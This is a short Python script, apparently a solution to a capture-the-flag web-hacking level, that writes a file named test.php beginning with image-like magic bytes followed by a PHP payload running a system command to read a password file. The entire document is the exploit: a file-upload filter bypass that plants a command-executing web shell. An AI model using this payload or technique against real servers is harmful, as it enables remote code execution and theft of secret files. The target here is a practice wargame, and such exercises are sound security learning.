#!/bin/python
fp = open("test.php",'w')
fp.write('\xd8\xff\xe0\xff' + '<?php system("cat /etc/natas_webpass/natas14");?>')
fp.close()
